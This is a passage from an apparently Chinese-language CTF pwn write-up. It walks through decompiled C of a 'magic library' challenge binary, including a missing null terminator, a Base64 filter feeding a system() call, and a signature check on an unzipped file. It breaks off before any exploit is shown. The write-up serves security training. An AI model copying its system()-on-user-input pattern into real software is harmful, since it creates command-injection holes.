</span></span><span style=display:flex><span>  buf <span style=color:#ff79c6>=</span> wizard_tag;
</span></span><span style=display:flex><span>  <span style=color:#50fa7b>read</span>(<span style=color:#bd93f9>0</span>, wizard_tag, <span style=color:#bd93f9>1535uLL</span>);
</span></span><span style=display:flex><span>  <span style=color:#50fa7b>printf</span>(<span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>Interact with magic library %s&#34;</span>, (<span style=color:#ff79c6>const</span> <span style=color:#8be9fd>char</span> <span style=color:#ff79c6>*</span>)buf);
</span></span><span style=display:flex><span>  <span style=color:#50fa7b>memset</span>(wizard_tag, <span style=color:#bd93f9>0</span>, <span style=color:#ff79c6>sizeof</span>(wizard_tag));
</span></span><span style=display:flex><span>  <span style=color:#ff79c6>while</span> ( <span style=color:#bd93f9>1</span> )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>while</span> ( <span style=color:#bd93f9>1</span> )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      command <span style=color:#ff79c6>=</span> <span style=color:#50fa7b>menu</span>();
</span></span><span style=display:flex><span>      <span style=color:#ff79c6>if</span> ( command <span style=color:#ff79c6>!=</span> <span style=color:#bd93f9>2</span> )
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>break</span>;
</span></span><span style=display:flex><span>      file_input <span style=color:#ff79c6>=</span> (<span style=color:#ff79c6>__int64</span> <span style=color:#ff79c6>*</span>)<span style=color:#50fa7b>spell_read</span>();
</span></span><span style=display:flex><span>      v6 <span style=color:#ff79c6>=</span> file_input[<span style=color:#bd93f9>1</span>];
</span></span><span style=display:flex><span>      wizard_tag[<span style=color:#bd93f9>0</span>] <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>*</span>file_input;
</span></span><span style=display:flex><span>      wizard_tag[<span style=color:#bd93f9>1</span>] <span style=color:#ff79c6>=</span> v6;
</span></span><span style=display:flex><span>      v7 <span style=color:#ff79c6>=</span> file_input[<span style=color:#bd93f9>3</span>];
</span></span><span style=display:flex><span>      wizard_tag[<span style=color:#bd93f9>2</span>] <span style=color:#ff79c6>=</span> file_input[<span style=color:#bd93f9>2</span>];
</span></span><span style=display:flex><span>      wizard_tag[<span style=color:#bd93f9>3</span>] <span style=color:#ff79c6>=</span> v7;
</span></span><span style=display:flex><span>      v8 <span style=color:#ff79c6>=</span> file_input[<span style=color:#bd93f9>5</span>];
</span></span><span style=display:flex><span>      wizard_tag[<span style=color:#bd93f9>4</span>] <span style=color:#ff79c6>=</span> file_input[<span style=color:#bd93f9>4</span>];
</span></span><span style=display:flex><span>      wizard_tag[<span style=color:#bd93f9>5</span>] <span style=color:#ff79c6>=</span> v8;
</span></span><span style=display:flex><span>      v9 <span style=color:#ff79c6>=</span> file_input[<span style=color:#bd93f9>7</span>];
</span></span><span style=display:flex><span>      wizard_tag[<span style=color:#bd93f9>6</span>] <span style=color:#ff79c6>=</span> file_input[<span style=color:#bd93f9>6</span>];
</span></span><span style=display:flex><span>      wizard_tag[<span style=color:#bd93f9>7</span>] <span style=color:#ff79c6>=</span> v9;
</span></span><span style=display:flex><span>      v10 <span style=color:#ff79c6>=</span> file_input[<span style=color:#bd93f9>9</span>];
</span></span><span style=display:flex><span>      wizard_tag[<span style=color:#bd93f9>8</span>] <span style=color:#ff79c6>=</span> file_input[<span style=color:#bd93f9>8</span>];
</span></span><span style=display:flex><span>      wizard_tag[<span style=color:#bd93f9>9</span>] <span style=color:#ff79c6>=</span> v10;
</span></span><span style=display:flex><span>      v11 <span style=color:#ff79c6>=</span> file_input[<span style=color:#bd93f9>11</span>];
</span></span><span style=display:flex><span>      wizard_tag[<span style=color:#bd93f9>10</span>] <span style=color:#ff79c6>=</span> file_input[<span style=color:#bd93f9>10</span>];
</span></span><span style=display:flex><span>      wizard_tag[<span style=color:#bd93f9>11</span>] <span style=color:#ff79c6>=</span> v11;
</span></span><span style=display:flex><span>      v12 <span style=color:#ff79c6>=</span> file_input[<span style=color:#bd93f9>13</span>];
</span></span><span style=display:flex><span>      wizard_tag[<span style=color:#bd93f9>12</span>] <span style=color:#ff79c6>=</span> file_input[<span style=color:#bd93f9>12</span>];
</span></span><span style=display:flex><span>      wizard_tag[<span style=color:#bd93f9>13</span>] <span style=color:#ff79c6>=</span> v12;
</span></span><span style=display:flex><span>      v13 <span style=color:#ff79c6>=</span> file_input[<span style=color:#bd93f9>15</span>];
</span></span><span style=display:flex><span>      wizard_tag[<span style=color:#bd93f9>14</span>] <span style=color:#ff79c6>=</span> file_input[<span style=color:#bd93f9>14</span>];
</span></span><span style=display:flex><span>      wizard_tag[<span style=color:#bd93f9>15</span>] <span style=color:#ff79c6>=</span> v13;
</span></span><span style=display:flex><span>      v14 <span style=color:#ff79c6>=</span> file_input[<span style=color:#bd93f9>17</span>];
</span></span><span style=display:flex><span>      wizard_tag[<span style=color:#bd93f9>16</span>] <span style=color:#ff79c6>=</span> file_input[<span style=color:#bd93f9>16</span>];
</span></span><span style=display:flex><span>      wizard_tag[<span style=color:#bd93f9>17</span>] <span style=color:#ff79c6>=</span> v14;
</span></span><span style=display:flex><span>      v15 <span style=color:#ff79c6>=</span> file_input[<span style=color:#bd93f9>19</span>];
</span></span><span style=display:flex><span>      wizard_tag[<span style=color:#bd93f9>18</span>] <span style=color:#ff79c6>=</span> file_input[<span style=color:#bd93f9>18</span>];
</span></span><span style=display:flex><span>      wizard_tag[<span style=color:#bd93f9>19</span>] <span style=color:#ff79c6>=</span> v15;
</span></span><span style=display:flex><span>      v16 <span style=color:#ff79c6>=</span> file_input[<span style=color:#bd93f9>21</span>];
</span></span><span style=display:flex><span>      wizard_tag[<span style=color:#bd93f9>20</span>] <span style=color:#ff79c6>=</span> file_input[<span style=color:#bd93f9>20</span>];
</span></span><span style=display:flex><span>      wizard_tag[<span style=color:#bd93f9>21</span>] <span style=color:#ff79c6>=</span> v16;
</span></span><span style=display:flex><span>      v17 <span style=color:#ff79c6>=</span> file_input[<span style=color:#bd93f9>23</span>];
</span></span><span style=display:flex><span>      wizard_tag[<span style=color:#bd93f9>22</span>] <span style=color:#ff79c6>=</span> file_input[<span style=color:#bd93f9>22</span>];
</span></span><span style=display:flex><span>      wizard_tag[<span style=color:#bd93f9>23</span>] <span style=color:#ff79c6>=</span> v17;
</span></span><span style=display:flex><span>      wizard_tag[<span style=color:#bd93f9>24</span>] <span style=color:#ff79c6>=</span> file_input[<span style=color:#bd93f9>24</span>];
</span></span><span style=display:flex><span>      <span style=color:#50fa7b>printf</span>(asc_401F80, wizard_tag);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> ( command <span style=color:#ff79c6>==</span> <span style=color:#bd93f9>3</span> )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#50fa7b>spell_save</span>(wizard_tag);
</span></span><span style=display:flex><span>      <span style=color:#50fa7b>exit</span>(<span style=color:#bd93f9>22</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> ( command <span style=color:#ff79c6>==</span> <span style=color:#bd93f9>1</span> )
</span></span><span style=display:flex><span>      <span style=color:#50fa7b>spell_upload</span>();
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>輸出介面，要使用者輸入一個 wizard tag，之後跳出幾個選項：</p><ol><li>Upload</li><li>read</li><li>Cast</li><li>Leave</li></ol><p>而由於 read() 後面不會補 <code>'\0'</code>，printf 可能會印出垃圾。</p><h3 id=upload>upload()</h3><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#8be9fd>int</span> <span style=color:#50fa7b>spell_upload</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#8be9fd>char</span> dest[<span style=color:#bd93f9>4096</span>]; <span style=color:#6272a4>// [rsp+0h] [rbp-1220h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>  <span style=color:#8be9fd>char</span> user_input[<span style=color:#bd93f9>520</span>]; <span style=color:#6272a4>// [rsp+1000h] [rbp-220h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>  <span style=color:#8be9fd>int</span> fd[<span style=color:#bd93f9>2</span>]; <span style=color:#6272a4>// [rsp+1208h] [rbp-18h]
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>  <span style=color:#8be9fd>unsigned</span> <span style=color:#ff79c6>__int64</span> len; <span style=color:#6272a4>// [rsp+1210h] [rbp-10h]
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>  <span style=color:#8be9fd>unsigned</span> <span style=color:#ff79c6>__int64</span> i; <span style=color:#6272a4>// [rsp+1218h] [rbp-8h]
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>
</span></span><span style=display:flex><span>  <span style=color:#50fa7b>memset</span>(user_input, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>512uLL</span>);
</span></span><span style=display:flex><span>  <span style=color:#50fa7b>memset</span>(dest, <span style=color:#bd93f9>0</span>, <span style=color:#ff79c6>sizeof</span>(dest));
</span></span><span style=display:flex><span>  <span style=color:#50fa7b>printf</span>(<span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>[*] Enter file (it will be named spell.zip): &#34;</span>);
</span></span><span style=display:flex><span>  len <span style=color:#ff79c6>=</span> <span style=color:#50fa7b>read</span>(<span style=color:#bd93f9>0</span>, user_input, <span style=color:#bd93f9>511uLL</span>);
</span></span><span style=display:flex><span>  user_input[len <span style=color:#ff79c6>-</span> <span style=color:#bd93f9>1</span>] <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;\0&#39;</span>;
</span></span><span style=display:flex><span>  <span style=color:#ff79c6>for</span> ( i <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0LL</span>; i <span style=color:#ff79c6>&lt;</span> len; <span style=color:#ff79c6>++</span>i )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> ( (user_input[i] <span style=color:#ff79c6>&lt;=</span> <span style=color:#f1fa8c>&#39;`&#39;</span> <span style=color:#ff79c6>||</span> user_input[i] <span style=color:#ff79c6>&gt;</span> <span style=color:#f1fa8c>&#39;z&#39;</span>) <span style=color:#6272a4>// a-z
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>      <span style=color:#ff79c6>&amp;&amp;</span> (user_input[i] <span style=color:#ff79c6>&lt;=</span> <span style=color:#f1fa8c>&#39;@&#39;</span> <span style=color:#ff79c6>||</span> user_input[i] <span style=color:#ff79c6>&gt;</span> <span style=color:#f1fa8c>&#39;Z&#39;</span>) <span style=color:#6272a4>// A-Z
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>      <span style=color:#ff79c6>&amp;&amp;</span> (user_input[i] <span style=color:#ff79c6>&lt;=</span> <span style=color:#f1fa8c>&#39;/&#39;</span> <span style=color:#ff79c6>||</span> user_input[i] <span style=color:#ff79c6>&gt;</span> <span style=color:#f1fa8c>&#39;9&#39;</span>) <span style=color:#6272a4>// 0-9
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>      <span style=color:#ff79c6>&amp;&amp;</span> user_input[i] <span style=color:#ff79c6>!=</span> <span style=color:#f1fa8c>&#39;.&#39;</span>
</span></span><span style=display:flex><span>      <span style=color:#ff79c6>&amp;&amp;</span> user_input[i]
</span></span><span style=display:flex><span>      <span style=color:#ff79c6>&amp;&amp;</span> user_input[i] <span style=color:#ff79c6>!=</span> <span style=color:#f1fa8c>&#39;+&#39;</span>
</span></span><span style=display:flex><span>      <span style=color:#ff79c6>&amp;&amp;</span> user_input[i] <span style=color:#ff79c6>!=</span> <span style=color:#f1fa8c>&#39;=&#39;</span> )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#50fa7b>printf</span>(<span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>%s[-] File contains invalid charcter: [%c]</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span>, <span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\x1B</span><span style=color:#f1fa8c>[1;31m&#34;</span>, (<span style=color:#8be9fd>unsigned</span> <span style=color:#8be9fd>int</span>)user_input[i]);
</span></span><span style=display:flex><span>      <span style=color:#50fa7b>exit</span>(<span style=color:#bd93f9>20</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#50fa7b>strcpy</span>(dest, <span style=color:#f1fa8c>&#34;echo &#39;&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#50fa7b>strcat</span>(dest, user_input);
</span></span><span style=display:flex><span>  <span style=color:#50fa7b>strcat</span>(dest, <span style=color:#f1fa8c>&#34;&#39; | base64 -d &gt; spell.zip&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#50fa7b>system</span>(dest);
</span></span><span style=display:flex><span>  <span style=color:#ff79c6>*</span>(_QWORD <span style=color:#ff79c6>*</span>)fd <span style=color:#ff79c6>=</span> <span style=color:#50fa7b>fopen</span>(<span style=color:#f1fa8c>&#34;spell.zip&#34;</span>, <span style=color:#f1fa8c>&#34;rb&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#ff79c6>if</span> ( <span style=color:#ff79c6>!*</span>(_QWORD <span style=color:#ff79c6>*</span>)fd )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#50fa7b>printf</span>(<span style=color:#f1fa8c>&#34;%s</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>[-] There is no such file!</span><span style=color:#f1fa8c>\n\n</span><span style=color:#f1fa8c>&#34;</span>, <span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\x1B</span><span style=color:#f1fa8c>[1;31m&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#50fa7b>exit</span>(<span style=color:#ff79c6>-</span><span style=color:#bd93f9>69</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#50fa7b>printf</span>(<span style=color:#f1fa8c>&#34;%s</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>[+] Spell has been added!</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>%s&#34;</span>, <span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\x1B</span><span style=color:#f1fa8c>[1;32m&#34;</span>, <span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\x1B</span><span style=color:#f1fa8c>[1;34m&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#ff79c6>return</span> <span style=color:#50fa7b>close</span>(fd[<span style=color:#bd93f9>0</span>]);
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>程式會檢查輸入是否為合法的 Base64 且不含 <code>/</code>，並將其解碼後寫到 <code>spell.zip</code> 檔案。</p><p>所以待會可能需要準備一個 Base64 的檔案，值得注意的是，這裡呼叫了 <code>system()</code>(system 函式已被載入到記憶體)</p><h3 id=read>read()</h3><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#8be9fd>char</span> <span style=color:#ff79c6>*</span><span style=color:#50fa7b>spell_read</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  FILE <span style=color:#ff79c6>*</span>stream; <span style=color:#6272a4>// [rsp+10h] [rbp-10h]
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>  <span style=color:#8be9fd>char</span> <span style=color:#ff79c6>*</span>ptr; <span style=color:#6272a4>// [rsp+18h] [rbp-8h]
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>
</span></span><span style=display:flex><span>  ptr <span style=color:#ff79c6>=</span> (<span style=color:#8be9fd>char</span> <span style=color:#ff79c6>*</span>)<span style=color:#50fa7b>malloc</span>(<span style=color:#bd93f9>0x190uLL</span>);
</span></span><span style=display:flex><span>  <span style=color:#50fa7b>system</span>(<span style=color:#f1fa8c>&#34;unzip spell.zip&#34;</span>);
</span></span><span style=display:flex><span>  stream <span style=color:#ff79c6>=</span> <span style=color:#50fa7b>fopen</span>(<span style=color:#f1fa8c>&#34;spell.txt&#34;</span>, <span style=color:#f1fa8c>&#34;rb&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#ff79c6>if</span> ( <span style=color:#ff79c6>!</span>stream )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#50fa7b>printf</span>(<span style=color:#f1fa8c>&#34;%s</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>[-] There is no such file!</span><span style=color:#f1fa8c>\n\n</span><span style=color:#f1fa8c>&#34;</span>, <span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\x1B</span><span style=color:#f1fa8c>[1;31m&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#50fa7b>exit</span>(<span style=color:#ff79c6>-</span><span style=color:#bd93f9>69</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#50fa7b>fread</span>(ptr, <span style=color:#bd93f9>0x18FuLL</span>, <span style=color:#bd93f9>1uLL</span>, stream);
</span></span><span style=display:flex><span>  <span style=color:#ff79c6>if</span> ( <span style=color:#50fa7b>strncmp</span>(ptr, <span style=color:#ff79c6>&amp;</span>s2, <span style=color:#bd93f9>4uLL</span>) <span style=color:#ff79c6>||</span> <span style=color:#50fa7b>strncmp</span>(ptr <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>4</span>, <span style=color:#ff79c6>&amp;</span>byte_401327, <span style=color:#bd93f9>3uLL</span>) )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#50fa7b>printf</span>(<span style=color:#f1fa8c>&#34;%s</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>[-] Your file does not have the signature of the boy who lived!</span><span style=color:#f1fa8c>\n\n</span><span style=color:#f1fa8c>&#34;</span>, <span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\x1B</span><span style=color:#f1fa8c>[1;31m&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#50fa7b>exit</span>(<span style=color:#bd93f9>1312</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#50fa7b>close</span>((<span style=color:#8be9fd>int</span>)stream);
</span></span><span style=display:flex><span>  <span style=color:#ff79c6>return</span> ptr;
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>將 spell.zip 解壓縮後打開 spell.txt，並檢查前四個 bytes 是否為 <code>\xF0\x9F\x91\x93</code> 且後面接著 <code>\xE2\x9A\xA1</code></p><p>把它們輸出出來看看</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>$ <span style=color:#8be9fd;font-style:italic>echo</span> -e <span style=color:#f1fa8c>&#34;\xF0\x9F\x91\x93\xE2\x9A\xA1&#34;</span>
</span></span><span style=display:flex><span>👓⚡
</span></span></code></pre></td></tr></table></div></div><h3 id=save>save()</h3><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
